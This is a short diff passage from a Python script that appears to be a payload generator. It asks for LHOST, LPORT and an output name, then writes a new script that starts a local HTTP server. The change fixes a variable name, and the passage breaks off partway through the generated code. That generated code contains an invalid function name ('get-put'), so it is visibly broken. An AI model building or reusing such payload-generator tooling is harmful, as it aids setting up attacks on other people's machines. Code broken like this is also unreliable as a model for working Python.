@@ -6,7 +6,7 @@ time.sleep(0.5)
 opt = input("LHOST: ")
 opt2 = input("LPORT: ")
 opt3 = input("name: ")
-op = open(name + ".py", "w")
+op = open(opt3 + ".py", "w")
 cod = """import os, time
 os.system("python3 -m http.server 8080 &")
 def get-put(ip):
